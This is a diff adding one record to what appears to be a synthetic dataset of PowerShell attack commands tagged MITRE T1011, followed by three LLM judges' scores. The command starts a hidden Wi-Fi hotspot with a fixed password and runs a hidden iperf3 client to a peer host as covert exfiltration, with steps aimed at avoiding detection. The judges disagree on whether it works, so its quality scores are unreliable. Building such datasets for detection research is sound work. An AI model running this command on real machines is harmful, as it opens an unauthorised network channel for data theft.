@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh wlan set hostednetwork mode=allow ssid=DiagWiFi key=Passw0rd! | Out-Null; netsh wlan start hostednetwork | Out-Null; $hn=Get-NetAdapter -InterfaceDescription 'Microsoft Hosted Network Virtual Adapter' -ErrorAction SilentlyContinue; if($hn){New-NetIPAddress -InterfaceIndex $hn.ifIndex -IPAddress 192.168.88.1 -PrefixLength 24 -ErrorAction SilentlyContinue; Start-Process -WindowStyle Hidden iperf3.exe -ArgumentList \"-c 192.168.88.2 -p 63456 -B 192.168.88.1 -t 40\"}",
+  "explanation": "Spawns a covert Wi‑Fi AP and immediately exfiltrates to a peer on that ad‑hoc subnet by binding iperf3 to the AP’s virtual adapter (alternate medium per T1011).",
+  "rationale_steps": [
+    "Set up and start a hosted Wi‑Fi network as an out‑of‑band medium.",
+    "Assign a private IP on the hosted network interface.",
+    "Run iperf3 client bound to that IP to a peer in the ad‑hoc subnet.",
+    "Use a high port and hidden window to reduce casual detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ceb18f2c",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, proper separators, and valid parameter usage throughout.",
+        "semantic_score": 2,
+        "semantic_justification": "While it tries to start a hosted network and run iperf3 bound to that interface, it needs admin privileges (despite 'None'), depends on a deprecated/specific adapter name, and iperf3 does not exfiltrate collected data, so it does not realistically achieve the stated automated exfiltration intent.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T02:53:24.117377Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax including balanced quotes, parentheses, braces, appropriate semicolons for command separation, valid flags, and proper error handling with ErrorAction parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Automated Exfiltration) by creating a covert WiFi access point, configuring networking, and using iperf3 to automatically exfiltrate data over this alternate communication channel to a predefined endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:53:27.284657Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed for PowerShell, with correct cmdlet usage, parameter passing, command separators, and balanced quotes/parentheses.",
+        "semantic_score": 2,
+        "semantic_justification": "The command semantically fails to achieve its claimed intent of spawning a Wi-Fi AP and exfiltrating data, as `netsh wlan` and `New-NetIPAddress` commands require Administrator privileges, directly contradicting the stated 'Privilege: None' constraint.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:34:45.365523Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
